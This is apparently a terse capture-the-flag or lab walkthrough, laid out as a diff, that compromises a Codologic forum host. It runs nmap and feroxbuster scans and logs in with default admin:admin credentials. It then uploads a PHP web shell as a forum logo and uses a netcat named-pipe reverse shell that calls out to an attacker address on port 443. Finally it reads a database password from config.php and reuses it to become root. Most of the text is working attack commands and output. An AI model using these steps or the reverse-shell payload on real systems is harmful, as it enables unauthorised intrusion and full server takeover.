@@ -1,0 +1,49 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.218.23 > Codo.txt
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: All topics | CODOLOGIC
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+feroxbuster -u http://192.168.218.23:80 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,bak,zip
+
+Found Admin login page.
+Log in with credential admin:admin.
+http://192.168.218.23/admin/index.php?page=config
+found Forum attachment path "assets/img/attachments"
+Upload logo for your forum, upload avatar.php , reshell PHP cmd.
+Then go http://192.168.218.23/sites/default/assets/img/attachments/avatar.php
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 443 >/tmp/f  execute
+
+get a reverse shell. 
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd
+/var/www/html/sites/default/assets/img/attachments
+$ find /var/www/html -name "*config*.php" 2>/dev/null
+$ cat /var/www/html/sites/default/config.php
+
+find password: "FatPanda123"
+$ su root
+Password: FatPanda123
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
